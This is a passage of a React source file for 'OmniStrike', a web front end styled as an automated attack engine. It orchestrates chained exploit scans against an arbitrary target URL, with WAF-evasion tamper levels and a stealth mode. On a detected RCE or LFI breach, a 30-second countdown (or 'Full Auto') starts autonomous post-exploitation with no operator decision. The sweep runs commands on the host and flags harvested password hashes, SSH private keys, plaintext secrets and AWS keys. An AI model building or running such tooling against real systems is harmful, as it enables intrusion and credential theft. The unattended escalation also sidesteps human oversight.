          <div className="flex items-center gap-2 text-amber-400">
            <RefreshCw className="h-3 w-3 animate-spin shrink-0" />
            <span>Executing next stage...</span>
          </div>
        )}
        {paused && (
          <div className="text-yellow-500 mt-2">
            ⏸ Paused — click Resume to continue or Take Control to switch to manual
          </div>
        )}
        {!running && log.length > 0 && (
          <div className="text-green-400 border-t border-gray-800 pt-3 mt-3">
            ✓ Autonomous sweep complete — {cmdsRun} commands · {findings.length} critical findings
          </div>
        )}
      </div>
    </div>
  );
}

// ── Helper: poll a scan until it completes ───────────────────────────────────
async function pollUntilDone(
  scanId: number,
  onTick: (scan: Scan) => void,
  abortRef: React.MutableRefObject<boolean>,
): Promise<Scan> {
  return new Promise((resolve, reject) => {
    const iv = setInterval(async () => {
      if (abortRef.current) { clearInterval(iv); reject(new Error("aborted")); return; }
      try {
        const r = await fetch(`${API}/scan/${scanId}`);
        const scan: Scan = await r.json();
        onTick(scan);
        if (scan.status !== "running") { clearInterval(iv); resolve(scan); }
      } catch (e) { clearInterval(iv); reject(e); }
    }, 1500);
  });
}

// ── Main OmniStrike Page ─────────────────────────────────────────────────────
export default function OmniStrike() {
  const { toast } = useToast();

  // Target / evasion — persisted across navigation for multitasking
  const [target, setTarget] = usePersistedState<string>("omnistrike-target", "");
  const [tamperLevel, setTamperLevel] = useState(4);
  const [stealthMode, setStealthMode] = useState(false);
  const [fullAuto, setFullAuto] = useState(false);

  // ── Breach / autonomous state ────────────────────────────────────────────
  const [breachState, setBreachState] = useState<"idle"|"alert"|"manual"|"autonomous">("idle");
  const [breachSession, setBreachSession] = useState<ExploitSession | null>(null);
  const [countdown, setCountdown] = useState(30);
  const [autonomousLog, setAutonomousLog] = useState<AutonomousEntry[]>([]);
  const [autonomousRunning, setAutonomousRunning] = useState(false);
  const [autonomousPaused, setAutonomousPaused] = useState(false);
  const autonomousPausedRef = useRef(false);
  const autoAbortRef = useRef(false);
  const countdownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const breachFiredRef = useRef(false);

  // Orchestrator mode
  const [orchMode, setOrchMode] = useState<"salvo" | "chain" | "custom">("chain");

  // Salvo: which categories are checked
  const [salvoCategories, setSalvoCategories] = useState<string[]>(CATEGORIES.map(c => c.id));

  // Custom: ordered + toggled modules
  const [customModules, setCustomModules] = useState<CustomModule[]>(
    CATEGORIES.map(c => ({ id: c.id, enabled: true }))
  );

  // Chain: which phases are enabled
  const [enabledPhases, setEnabledPhases] = useState<boolean[]>(PHASES.map(() => true));

  // Active single scan (salvo / custom)
  const [activeScan, setActiveScan] = useState<Scan | null>(null);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // Chain execution state
  const [chainRunning, setChainRunning] = useState(false);
  const [phaseStatuses, setPhaseStatuses] = useState<PhaseStatus[]>([]);
  const [chainScans, setChainScans] = useState<Scan[]>([]);
  const abortRef = useRef(false);

  // UI — key state persisted across navigation for multitasking
  const [scans, setScans] = usePersistedState<Scan[]>("omnistrike-scans", []);
  const [expandedFindings, setExpandedFindings] = useState<Set<number>>(new Set());
  const [showLog, setShowLog] = useState(true);
  const [mainTab, setMainTab] = usePersistedState<"run"|"history">("omnistrike-maintab", "run");
  const [sessionData, setSessionData] = useState<ExploitSession | null>(null);
  const [showDesktop, setShowDesktop] = useState(false);
  const logRef = useRef<HTMLDivElement>(null);

  useEffect(() => { loadScans(); }, []);
  useEffect(() => {
    if (logRef.current) logRef.current.scrollTop = logRef.current.scrollHeight;
  }, [activeScan?.log]);

  const loadScans = async () => {
    try { const r = await fetch(`${API}/scans`); const d = await r.json(); setScans(d.scans ?? []); } catch {}
  };

  const startPoll = (id: number) => {
    if (pollRef.current) clearInterval(pollRef.current);
    pollRef.current = setInterval(async () => {
      try {
        const r = await fetch(`${API}/scan/${id}`);
        const scan = await r.json();
        setActiveScan(scan);
        if (scan.session) {
          setSessionData(scan.session);
          triggerBreach(scan.session);
        }
        if (scan.status !== "running") { clearInterval(pollRef.current!); pollRef.current = null; loadScans(); }
      } catch {}
    }, 1500);
  };

  // ── Breach detection & autonomous control ────────────────────────────────
  const triggerBreach = useCallback((sess: ExploitSession) => {
    if (breachFiredRef.current) return;
    breachFiredRef.current = true;
    setBreachSession(sess);
    setSessionData(sess);
    if (fullAuto) {
      setBreachState("autonomous");
      runAutonomous(sess);
    } else {
      setBreachState("alert");
      setCountdown(30);
      if (countdownRef.current) clearInterval(countdownRef.current);
      countdownRef.current = setInterval(() => {
        setCountdown(prev => {
          if (prev <= 1) {
            clearInterval(countdownRef.current!);
            countdownRef.current = null;
            setBreachState("autonomous");
            runAutonomous(sess);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [fullAuto]);

  const chooseManual = () => {
    if (countdownRef.current) { clearInterval(countdownRef.current); countdownRef.current = null; }
    autoAbortRef.current = true;
    setBreachState("manual");
    setShowDesktop(true);
  };

  const chooseAutonomous = () => {
    if (countdownRef.current) { clearInterval(countdownRef.current); countdownRef.current = null; }
    setBreachState("autonomous");
    if (breachSession) runAutonomous(breachSession);
  };

  const takeControlFromAuto = () => {
    autoAbortRef.current = true;
    setAutonomousRunning(false);
    setBreachState("manual");
    setShowDesktop(true);
  };

  const toggleAutoPause = () => {
    setAutonomousPaused(prev => {
      const next = !prev;
      autonomousPausedRef.current = next;
      return next;
    });
  };

  const resetBreach = () => {
    if (countdownRef.current) { clearInterval(countdownRef.current); countdownRef.current = null; }
    autoAbortRef.current = true;
    autonomousPausedRef.current = false;
    breachFiredRef.current = false;
    setBreachState("idle");
    setBreachSession(null);
    setAutonomousLog([]);
    setAutonomousRunning(false);
    setAutonomousPaused(false);
  };

  const runAutonomous = async (sess: ExploitSession) => {
    autoAbortRef.current = false;
    autonomousPausedRef.current = false;
    setAutonomousPaused(false);
    setAutonomousLog([]);
    setAutonomousRunning(true);
    const ts = () => new Date().toLocaleTimeString();
    const addEntry = (entry: AutonomousEntry) => setAutonomousLog(prev => [...prev, entry]);
    const isRce = sess.vector === "rce";
    const scanId = sess.scanId;

    const flagFindings = (output: string) => {
      if (output.match(/root:[x*]:0:0/)) addEntry({ cmd: "🔴 CRITICAL: Root account found in /etc/passwd", output: "", ts: ts(), kind: "breach" });
      if (output.match(/\$[126y]\$|\$2[aby]\$/)) addEntry({ cmd: "🔴 CRITICAL: Password hashes extracted — brute-force offline", output: "", ts: ts(), kind: "breach" });
      if (output.match(/\b(password|passwd|secret|api_key|token|db_pass)\s*[=:]\s*\S+/i)) addEntry({ cmd: "🔴 CRITICAL: Credential found in plaintext", output: "", ts: ts(), kind: "breach" });
      if (output.includes("BEGIN RSA PRIVATE KEY") || output.includes("BEGIN OPENSSH PRIVATE KEY") || output.includes("BEGIN EC PRIVATE KEY")) addEntry({ cmd: "🔴 CRITICAL: SSH private key extracted — full auth bypass possible", output: "", ts: ts(), kind: "breach" });
      if (output.match(/aws_access_key_id|AKIA[A-Z0-9]{16}/i)) addEntry({ cmd: "🔴 CRITICAL: AWS credentials found", output: "", ts: ts(), kind: "breach" });
    };

    if (isRce) {
      for (const step of AUTO_RECON_RCE) {
        if (autoAbortRef.current) break;
        while (autonomousPausedRef.current && !autoAbortRef.current) await sleep(400);
        if (autoAbortRef.current) break;
        try {
          const r = await fetch(`${API}/console/${scanId}/exec`, {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ command: step.cmd }),
          });
          const d = await r.json();
          const output: string = d.output ?? "(no output)";
          addEntry({ cmd: step.cmd, output, ts: ts(), kind: "cmd" });
          flagFindings(output);
          await sleep(700);
        } catch { addEntry({ cmd: step.cmd, output: "(connection error)", ts: ts(), kind: "cmd" }); }
      }
    } else {
      for (const step of AUTO_RECON_LFI) {
        if (autoAbortRef.current) break;
        while (autonomousPausedRef.current && !autoAbortRef.current) await sleep(400);
        if (autoAbortRef.current) break;
        try {
          const r = await fetch(`${API}/console/${scanId}/read`, {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ filePath: step.path }),
          });
          const d = await r.json();
          const output: string = d.content ?? "(not readable)";
          addEntry({ cmd: `cat ${step.path}  # ${step.label}`, output, ts: ts(), kind: "cmd" });
          flagFindings(output);
          await sleep(600);
        } catch { addEntry({ cmd: `cat ${step.path}`, output: "(error)", ts: ts(), kind: "cmd" }); }
      }
    }

    if (!autoAbortRef.current) {
      setAutonomousRunning(false);
      toast({ title: "Autonomous sweep complete", description: `${isRce ? AUTO_RECON_RCE.length : AUTO_RECON_LFI.length} commands executed` });
    }
  };

  // ── SALVO / CUSTOM: single scan ──────────────────────────────────────────
  const launchSingleScan = async (cats: string[]): Promise<void> => {
    if (!target.trim()) { toast({ title: "Enter a target URL", variant: "destructive" }); return; }
    if (cats.length === 0) { toast({ title: "Enable at least one module", variant: "destructive" }); return; }
    let url = target.trim();
    if (!/^https?:\/\//i.test(url)) url = "https://" + url;
    try {
      const r = await fetch(`${API}/scan`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ target: url, categories: cats, tamperLevel, stealthMode }),
      });
      if (!r.ok) { const e = await r.json(); toast({ title: "Launch failed", description: e.error, variant: "destructive" }); return; }
      const { scanId } = await r.json();
      const sr = await fetch(`${API}/scan/${scanId}`);
      const scan = await sr.json();
      setActiveScan(scan); setSessionData(null); setShowDesktop(false);
      setMainTab("run"); startPoll(scanId);
      toast({ title: orchMode === "salvo" ? "Full Salvo launched" : "Custom run launched", description: `Targeting ${url} · ${cats.length} modules` });
    } catch (e: any) { toast({ title: "Error", description: e.message, variant: "destructive" }); }
  };

  const stopScan = async () => {
    if (!activeScan) return;
    await fetch(`${API}/scan/${activeScan.id}/stop`, { method: "POST" });
    if (pollRef.current) clearInterval(pollRef.current);
    toast({ title: "Scan stopped" });
  };

  // ── AUTO-CHAIN: sequential phase execution ───────────────────────────────
  const launchChain = async (): Promise<void> => {
    if (!target.trim()) { toast({ title: "Enter a target URL", variant: "destructive" }); return; }
    let url = target.trim();
    if (!/^https?:\/\//i.test(url)) url = "https://" + url;

    const activePhases = PHASES.filter((_, i) => enabledPhases[i]);
    if (activePhases.length === 0) { toast({ title: "Enable at least one phase", variant: "destructive" }); return; }

    abortRef.current = false;
    setChainRunning(true);
    setChainScans([]);
    setSessionData(null); setShowDesktop(false);
    setActiveScan(null);
    setMainTab("run");

    const initialStatuses: PhaseStatus[] = PHASES.map((_, i) => ({
      phaseIdx: i,
      status: enabledPhases[i] ? "waiting" : "skipped",
      findings: 0,
      confirmed: 0,
    }));
    setPhaseStatuses(initialStatuses);

    const allChainScans: Scan[] = [];

    for (let i = 0; i < PHASES.length; i++) {
      if (!enabledPhases[i]) continue;
      if (abortRef.current) break;

      // Mark phase as running
      setPhaseStatuses(prev => prev.map((p, idx) => idx === i ? { ...p, status: "running" } : p));

      try {
        const r = await fetch(`${API}/scan`, {
          method: "POST", headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ target: url, categories: PHASES[i].modules, tamperLevel, stealthMode }),
        });
        if (!r.ok) {
          setPhaseStatuses(prev => prev.map((p, idx) => idx === i ? { ...p, status: "done", findings: 0, confirmed: 0 } : p));
          continue;
        }
        const { scanId } = await r.json();

        // Update active scan display
        const initialScan = await (await fetch(`${API}/scan/${scanId}`)).json();
        setActiveScan(initialScan);

        const completedScan = await pollUntilDone(
          scanId,
          (scan) => {
            setActiveScan(scan);
            if (scan.session) setSessionData(scan.session);
          },
          abortRef,
        );

        allChainScans.push(completedScan);
        setChainScans([...allChainScans]);

        const confirmed = (completedScan.findings ?? []).filter((f: Finding) => f.bypassed).length;
        setPhaseStatuses(prev => prev.map((p, idx) =>
          idx === i ? { ...p, status: "done", scanId, scan: completedScan, findings: (completedScan.findings ?? []).length, confirmed } : p
        ));

        // If we found an RCE/LFI in this phase, trigger the breach handler
        if (completedScan.session) {
          setSessionData(completedScan.session);
          triggerBreach(completedScan.session);
        }

      } catch (e: any) {
        if (e.message === "aborted") break;
        setPhaseStatuses(prev => prev.map((p, idx) => idx === i ? { ...p, status: "done" } : p));
      }
    }

    setChainRunning(false);
    loadScans();

    const totalConfirmed = allChainScans.reduce((acc, s) => acc + (s.findings ?? []).filter((f: Finding) => f.bypassed).length, 0);
    toast({
      title: abortRef.current ? "Chain aborted" : "Attack chain complete",
      description: `${allChainScans.length} phases run · ${totalConfirmed} confirmed vulnerabilities`,
    });
  };

  const stopChain = () => {
    abortRef.current = true;
    setChainRunning(false);
    toast({ title: "Chain aborted" });
  };

  // ── Main launch dispatcher ───────────────────────────────────────────────
  const launch = () => {
    resetBreach();
    if (orchMode === "salvo") launchSingleScan(salvoCategories);
    else if (orchMode === "custom") launchSingleScan(customModules.filter(m => m.enabled).map(m => m.id));
    else launchChain();
  };

  const isRunning = activeScan?.status === "running" || chainRunning;

  const stop = () => {
    if (chainRunning) stopChain();
    else stopScan();
  };

  // Custom module ordering helpers
  const moveCustomModule = (idx: number, dir: -1 | 1) => {
    const next = idx + dir;
    if (next < 0 || next >= customModules.length) return;
    setCustomModules(prev => {
      const arr = [...prev];
      [arr[idx], arr[next]] = [arr[next], arr[idx]];
      return arr;
    });
  };

  const toggleCustomModule = (id: string) => {
    setCustomModules(prev => prev.map(m => m.id === id ? { ...m, enabled: !m.enabled } : m));
  };

  // Aggregated findings across all chain scans + active scan
  const allFindings: Finding[] = orchMode === "chain"
    ? chainScans.flatMap(s => s.findings ?? [])
    : (activeScan?.findings ?? []);
  const confirmedFindings = allFindings.filter(f => f.bypassed);

  // Display scan (the most recent active)
  const displayScan = activeScan;
  const stats = displayScan?.stats;

  const hasSession = !!(displayScan?.session || sessionData);
  const canGetSession = !isRunning && allFindings.some(f => f.bypassed && (f.canExec || f.canRead));

  const loadScan = async (id: number) => {
    const r = await fetch(`${API}/scan/${id}`);
    const scan = await r.json();
    setActiveScan(scan);
    if (scan.session) setSessionData(scan.session);
    setMainTab("run");
    if (scan.status === "running") startPoll(id);
  };

  const deleteScan = async (id: number) => {
    await fetch(`${API}/scan/${id}`, { method: "DELETE" });
    loadScans();
    if (activeScan?.id === id) setActiveScan(null);
    toast({ title: "Scan deleted" });
  };

  const loadSession = async (id: number): Promise<void> => {
    try {
      const r = await fetch(`${API}/console/${id}/session`);
      if (!r.ok) { const e = await r.json(); toast({ title: "No session available", description: e.error, variant: "destructive" }); return; }
      const sess = await r.json();
      setSessionData(sess); setShowDesktop(true);
    } catch (e: any) { toast({ title: "Error", description: e.message, variant: "destructive" }); }
  };

  const exportReport = useCallback(() => {
    const scanList = orchMode === "chain" ? chainScans : (activeScan ? [activeScan] : []);
    if (scanList.length === 0) return;
    const allF = scanList.flatMap(s => s.findings ?? []);
    const lines = [
      `# OmniStrike Penetration Test Report`,
      `## Target: ${target}`,
      `**Mode:** ${orchMode === "chain" ? "Auto-Chain (Strategic Order)" : orchMode === "salvo" ? "Full Salvo" : "Custom"}`,
      `**Date:** ${new Date().toLocaleString()}`,
      `**Phases / Scans:** ${scanList.length}`,
      `**Total Findings:** ${allF.length}`,
      `**Confirmed Exploitable:** ${allF.filter(f=>f.bypassed).length}`,
      ``,
      `---`,
      `## Confirmed Findings`,
      ...allF.filter(f => f.bypassed).map((f, i) => [
        ``,
        `### ${i + 1}. [${f.severity.toUpperCase()}] ${f.category} — ${f.technique}`,
        `| Field | Value |`,
        `|-------|-------|`,
        `| URL | \`${f.url}\` |`,
        `| Parameter | \`${f.param}\` |`,
        `| HTTP Status | ${f.statusCode} |`,
        `| Response Time | ${f.responseTime}ms |`,
        `| Severity | **${f.severity.toUpperCase()}** |`,
        ``,
        `**Payload:**`,
        `\`\`\``,
        f.payload,
        `\`\`\``,
        `**Evidence:** ${f.evidence}`,
        `**Exploit URL:** \`${f.url}\``,
      ].join("\n")),
      ``,
      `---`,
      `*Generated by OmniStrike — ProxhqVPN Command Center Pro*`,
      `*© 2024–2026 ALPHA UNLIMITED TECHNOLOGIES LLC*`,
    ];
    const blob = new Blob([lines.join("\n")], { type: "text/markdown" });
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = `omnistrike-report-${Date.now()}.md`;
    a.click();
    toast({ title: "Report downloaded" });
  }, [activeScan, chainScans, orchMode, target]);

  return (
    <div className="min-h-screen bg-[#0a0a0f] text-gray-100 p-4 md:p-6">
      {/* ── Breach Alert Overlay (portal to viewport) ────────────── */}
      {breachState === "alert" && breachSession && (
        <BreachAlertOverlay
          session={breachSession}
          countdown={countdown}
          onManual={chooseManual}
          onAutonomous={chooseAutonomous}
        />
      )}

      {/* Header */}
      <div className="mb-6">
        <div className="flex flex-wrap items-center gap-3 mb-1">
          <Zap className="h-7 w-7 text-red-400" />
          <h1 className="text-2xl font-bold text-white">OmniStrike</h1>
          <Badge className="bg-red-900 text-red-300 border-red-700">Automated Attack Engine</Badge>
          <Badge className="bg-purple-900 text-purple-300 border-purple-700">⚛ QuantumBreach</Badge>
          <Badge className="bg-gray-800 text-gray-400 border-gray-700">👻 ShadowVector</Badge>
        </div>
        <p className="text-gray-400 text-sm">
          Multi-vector penetration testing engine with Attack Orchestrator — run all at once, chain strategically, or build your own sequence.
        </p>
      </div>

      {/* Tabs */}
      <div className="flex gap-1 mb-6 border-b border-gray-800">
        {[["run","Run / Results"], ["history","Scan History"]].map(([id, label]) => (
          <button key={id} onClick={() => setMainTab(id as any)}
            className={`px-4 py-2 text-sm font-medium border-b-2 transition-colors ${mainTab === id ? "border-red-500 text-red-400" : "border-transparent text-gray-400 hover:text-gray-200"}`}>
            {label}
          </button>
        ))}
      </div>

      {mainTab === "run" && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 xl:grid-cols-3 gap-6">

            {/* ── LEFT COLUMN: Config ────────────────────────────────────── */}
            <div className="space-y-4">

              {/* Target */}
              <div className="bg-gray-900 border border-gray-800 rounded-lg p-4">
                <h2 className="text-sm font-semibold text-gray-300 mb-3 uppercase tracking-wider">Target</h2>
                <Input value={target} onChange={e => setTarget(e.target.value)} placeholder="https://target.com"
                  className="bg-gray-800 border-gray-700 text-white font-mono text-sm mb-3"
                  onKeyDown={e => e.key === "Enter" && !isRunning && launch()} />
                <div className="flex gap-2">
                  <Button onClick={launch} disabled={isRunning}
                    className={`flex-1 text-white font-bold ${orchMode === "chain" ? "bg-amber-600 hover:bg-amber-700" : orchMode === "salvo" ? "bg-red-600 hover:bg-red-700" : "bg-blue-700 hover:bg-blue-800"}`}>
                    {orchMode === "chain"
                      ? <><ListOrdered className="h-4 w-4 mr-2" />{isRunning ? "Running Chain..." : "Run Chain"}</>
                      : orchMode === "salvo"
                      ? <><Swords className="h-4 w-4 mr-2" />{isRunning ? "Attacking..." : "Full Salvo"}</>
                      : <><Crosshair className="h-4 w-4 mr-2" />{isRunning ? "Running..." : "Launch Custom"}</>
                    }
                  </Button>
                  {isRunning && (
                    <Button onClick={stop} variant="outline" className="border-gray-600 text-gray-300">
                      <Square className="h-4 w-4" />
                    </Button>
                  )}
                </div>
              </div>

              {/* Evasion */}
              <div className="bg-gray-900 border border-gray-800 rounded-lg p-4 space-y-4">
                <h2 className="text-sm font-semibold text-gray-300 uppercase tracking-wider">Evasion</h2>
                <div>
                  <div className="flex justify-between mb-1">
                    <label className="text-sm text-gray-400">Tamper Level</label>
                    <span className="text-sm font-mono text-red-400">{tamperLevel}/7</span>
                  </div>
                  <input type="range" min={0} max={7} value={tamperLevel} onChange={e => setTamperLevel(+e.target.value)}
                    className="w-full accent-red-500" />
                  <p className="text-xs text-gray-500 mt-1">
                    {tamperLevel <= 1 ? "Raw payloads" : tamperLevel <= 3 ? "Comment + case obfuscation" : tamperLevel <= 5 ? "URL encode + SQL tampers" : "Max: all tampers chained"}
                  </p>
                </div>
                <label className="flex items-center gap-3 cursor-pointer">
                  <div className={`w-10 h-5 rounded-full transition-colors relative ${stealthMode ? "bg-red-600" : "bg-gray-700"}`}
                    onClick={() => setStealthMode(p => !p)}>
                    <div className={`absolute top-0.5 w-4 h-4 rounded-full bg-white transition-all ${stealthMode ? "left-5" : "left-0.5"}`} />
                  </div>
                  <span className="text-sm text-gray-300">Stealth Mode</span>
                </label>

                {/* Divider */}
                <div className="border-t border-gray-800 pt-3 mt-1">
                  <div className="flex items-center gap-2 mb-1.5">
                    <Bot className="h-3.5 w-3.5 text-amber-400" />
                    <span className="text-xs font-semibold text-gray-300 uppercase tracking-wider">Autonomous Mode</span>
                  </div>
                  <label className="flex items-center gap-3 cursor-pointer mb-2">
                    <div className={`w-10 h-5 rounded-full transition-colors relative ${fullAuto ? "bg-amber-600" : "bg-gray-700"}`}
                      onClick={() => setFullAuto(p => !p)}>
                      <div className={`absolute top-0.5 w-4 h-4 rounded-full bg-white transition-all ${fullAuto ? "left-5" : "left-0.5"}`} />
                    </div>
                    <div>
                      <span className="text-sm text-gray-300">Full Auto</span>
                      <p className="text-[10px] text-gray-600 leading-tight mt-0.5">
                        Skip the 30s prompt — instantly run autonomous operator on breach
                      </p>
                    </div>
                  </label>
                  {!fullAuto && (
                    <p className="text-[10px] text-gray-600 leading-tight">
                      Off: breach alert with 30s timer to choose manual or autonomous
                    </p>
                  )}
                </div>
              </div>

              {/* ── ATTACK ORCHESTRATOR ────────────────────────────────── */}
              <div className="bg-gray-900 border border-gray-800 rounded-lg p-4">
                <h2 className="text-sm font-semibold text-gray-300 uppercase tracking-wider mb-3 flex items-center gap-2">
                  <Layers className="h-4 w-4 text-amber-400" /> Attack Orchestrator
                </h2>

                {/* Mode selector */}
                <div className="grid grid-cols-3 gap-1 mb-4 bg-gray-800 rounded-lg p-1">
                  {([
                    ["chain",  "Auto-Chain", ListOrdered, "amber"],
                    ["salvo",  "Full Salvo", Swords,      "red"],
                    ["custom", "Custom",     Settings2,   "blue"],
                  ] as const).map(([mode, label, Icon, color]) => (
                    <button key={mode} onClick={() => setOrchMode(mode)}
                      className={`flex flex-col items-center gap-1 py-2 rounded-md text-xs font-semibold transition-all ${
                        orchMode === mode
                          ? color === "amber" ? "bg-amber-700/60 text-amber-200 shadow" : color === "red" ? "bg-red-700/60 text-red-200 shadow" : "bg-blue-700/60 text-blue-200 shadow"
                          : "text-gray-400 hover:text-gray-200"
                      }`}>
                      <Icon className="h-4 w-4" />
                      {label}
                    </button>
                  ))}
                </div>

                {/* Mode description */}
                <p className="text-xs text-gray-500 mb-4 leading-relaxed">
                  {orchMode === "chain"
                    ? "Runs 6 strategic phases in order: Recon → Auth → Injection → Execution → Client-Side → Advanced Sweep. Each phase informs the next."
                    : orchMode === "salvo"
                    ? "Fire all selected modules simultaneously in a single scan. Maximum noise, maximum speed."
                    : "Pick exactly which modules to run and the order they run in. Full operator control."}
                </p>

                {/* ── CHAIN: phase list ─────────────────────────────────── */}
                {orchMode === "chain" && (
                  <div className="space-y-2">
                    <div className="flex items-center justify-between mb-2">
                      <span className="text-xs text-gray-400">Toggle phases on/off</span>
                      <div className="flex gap-2">
                        <button className="text-xs text-amber-400" onClick={() => setEnabledPhases(PHASES.map(() => true))}>All</button>
                        <button className="text-xs text-gray-500" onClick={() => setEnabledPhases(PHASES.map(() => false))}>None</button>
                      </div>
                    </div>
                    {PHASES.map((phase, i) => (
                      <div key={phase.id} className={`border rounded-lg p-2.5 transition-all ${enabledPhases[i] ? PHASE_COLORS[phase.color] : "border-gray-800 bg-gray-900/40 opacity-50"}`}>
                        <div className="flex items-center gap-2">
                          <input type="checkbox" checked={enabledPhases[i]} onChange={() => setEnabledPhases(prev => { const a = [...prev]; a[i] = !a[i]; return a; })}
                            className="accent-amber-500 shrink-0" />
                          <span className="text-base">{phase.icon}</span>
                          <span className={`text-xs font-semibold ${enabledPhases[i] ? PHASE_LABEL_COLORS[phase.color] : "text-gray-500"}`}>{phase.label}</span>
                        </div>
                        {enabledPhases[i] && (
                          <>
                            <div className="flex flex-wrap gap-1 mt-2 ml-6">
                              {phase.modules.map(m => {
                                const cat = CATEGORIES.find(c => c.id === m);
                                return <span key={m} className={`text-[10px] px-1.5 py-0.5 rounded font-mono ${PHASE_BADGE_COLORS[phase.color]}`}>{cat?.icon} {cat?.label ?? m}</span>;
                              })}
                            </div>
                            <p className="text-[10px] text-gray-500 mt-1.5 ml-6 leading-relaxed">{phase.rationale}</p>
                          </>
                        )}
                      </div>
                    ))}
                  </div>
                )}

                {/* ── SALVO: module toggle grid ────────────────────────── */}
                {orchMode === "salvo" && (
                  <div className="space-y-2">
                    <div className="flex items-center justify-between mb-2">
                      <span className="text-xs text-gray-400">{salvoCategories.length} of {CATEGORIES.length} selected</span>
                      <div className="flex gap-2">
                        <button className="text-xs text-red-400" onClick={() => setSalvoCategories(CATEGORIES.map(c => c.id))}>All</button>
                        <button className="text-xs text-gray-400" onClick={() => setSalvoCategories([])}>None</button>
                      </div>
                    </div>
                    <div className="space-y-1.5 max-h-72 overflow-y-auto pr-1">
                      {CATEGORIES.map(cat => (
                        <label key={cat.id} className="flex items-start gap-3 cursor-pointer group">
                          <input type="checkbox" checked={salvoCategories.includes(cat.id)}
                            onChange={() => setSalvoCategories(prev => prev.includes(cat.id) ? prev.filter(c => c !== cat.id) : [...prev, cat.id])}
                            className="mt-0.5 accent-red-500 shrink-0" />
                          <div>
                            <div className={`text-xs font-medium group-hover:text-white ${cat.id === "quantumbreach" ? "text-purple-300" : cat.id === "shadowvector" ? "text-gray-300" : "text-gray-300"}`}>
                              {cat.icon} {cat.label}
                            </div>
                            <div className="text-[10px] text-gray-600 leading-tight">{cat.desc}</div>
                          </div>
                        </label>
                      ))}
                    </div>
                  </div>
                )}

                {/* ── CUSTOM: ordered module list ──────────────────────── */}
                {orchMode === "custom" && (
                  <div className="space-y-1.5 max-h-96 overflow-y-auto pr-1">
                    <p className="text-[10px] text-gray-500 mb-2">Drag order with ↑↓. Unchecked modules are skipped.</p>
                    {customModules.map((mod, i) => {
                      const cat = CATEGORIES.find(c => c.id === mod.id)!;
                      return (
                        <div key={mod.id}
                          className={`flex items-center gap-2 bg-gray-800 border rounded-lg px-2.5 py-2 transition-all ${mod.enabled ? "border-blue-900/60" : "border-gray-800 opacity-50"}`}>
                          <span className="text-[10px] text-gray-600 font-mono w-4 text-right shrink-0">{i + 1}</span>
                          <input type="checkbox" checked={mod.enabled} onChange={() => toggleCustomModule(mod.id)}
                            className="accent-blue-500 shrink-0" />
                          <span className="text-base shrink-0">{cat.icon}</span>
                          <span className={`text-xs flex-1 font-medium truncate ${mod.enabled ? "text-gray-200" : "text-gray-500"}`}>{cat.label}</span>
                          <div className="flex flex-col gap-0.5 shrink-0">
                            <button onClick={() => moveCustomModule(i, -1)} disabled={i === 0}
                              className="text-gray-500 hover:text-gray-200 disabled:opacity-20">
                              <Up className="h-3 w-3" />
                            </button>
                            <button onClick={() => moveCustomModule(i, 1)} disabled={i === customModules.length - 1}
                              className="text-gray-500 hover:text-gray-200 disabled:opacity-20">
                              <Dn className="h-3 w-3" />
                            </button>
                          </div>
                        </div>
                      );
                    })}
                  </div>
                )}
              </div>
            </div>

            {/* ── RIGHT COLUMN: Results ──────────────────────────────────── */}
            <div className="xl:col-span-2 space-y-4">

              {/* Phase Timeline (chain mode) */}
              {orchMode === "chain" && (phaseStatuses.length > 0 || chainRunning) && (
                <div className="bg-gray-900 border border-gray-800 rounded-lg p-4">
                  <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3 flex items-center gap-2">
                    <ListOrdered className="h-4 w-4 text-amber-400" />
                    Chain Progress
                    {chainRunning && <RefreshCw className="h-3 w-3 animate-spin text-amber-400 ml-1" />}
                  </h3>
                  <div className="space-y-2">
                    {PHASES.map((phase, i) => {
                      const ps = phaseStatuses[i];
                      if (!ps) return null;
                      const isRunningPhase = ps.status === "running";
                      const isDone = ps.status === "done";
                      const isSkipped = ps.status === "skipped";
                      const isWaiting = ps.status === "waiting";
                      return (
                        <div key={phase.id} className={`flex items-center gap-3 rounded-lg px-3 py-2 border transition-all ${
                          isRunningPhase ? `${PHASE_COLORS[phase.color]} border-opacity-100 shadow-lg` :
                          isDone ? "bg-gray-800/60 border-gray-700" :
                          isSkipped ? "bg-gray-900/30 border-gray-800 opacity-40" :
                          "bg-gray-900/30 border-gray-800"
                        }`}>
                          <div className="shrink-0 w-5 h-5 flex items-center justify-center">
                            {isRunningPhase && <RefreshCw className="h-4 w-4 animate-spin text-amber-400" />}
                            {isDone && <CheckCircle2 className={`h-4 w-4 ${ps.confirmed > 0 ? "text-red-400" : "text-green-600"}`} />}
                            {isSkipped && <SkipForward className="h-4 w-4 text-gray-600" />}
                            {isWaiting && <Circle className="h-4 w-4 text-gray-700" />}
                          </div>
                          <span className="text-base">{phase.icon}</span>
                          <div className="flex-1 min-w-0">
                            <div className={`text-xs font-semibold ${isRunningPhase ? PHASE_LABEL_COLORS[phase.color] : isDone ? "text-gray-200" : "text-gray-600"}`}>
                              {phase.label}
                            </div>
                            <div className="text-[10px] text-gray-500">
                              {phase.modules.map(m => CATEGORIES.find(c => c.id === m)?.label ?? m).join(" · ")}
                            </div>
                          </div>
                          {isDone && (
                            <div className="text-right shrink-0">
                              <div className={`text-xs font-bold ${ps.confirmed > 0 ? "text-red-400" : "text-gray-500"}`}>{ps.confirmed} confirmed</div>
                              <div className="text-[10px] text-gray-600">{ps.findings} total</div>
                            </div>
                          )}
                          {isRunningPhase && (
                            <div className="text-xs text-amber-400 font-mono shrink-0 animate-pulse">LIVE</div>
                          )}
                        </div>
                      );
                    })}
                  </div>
                  {chainScans.length > 0 && (
                    <div className="mt-3 pt-3 border-t border-gray-800 grid grid-cols-4 gap-2">
                      {[
                        { label: "Critical", value: chainScans.flatMap(s=>s.findings??[]).filter(f=>f.severity==="critical"&&f.bypassed).length, color: "text-red-400" },
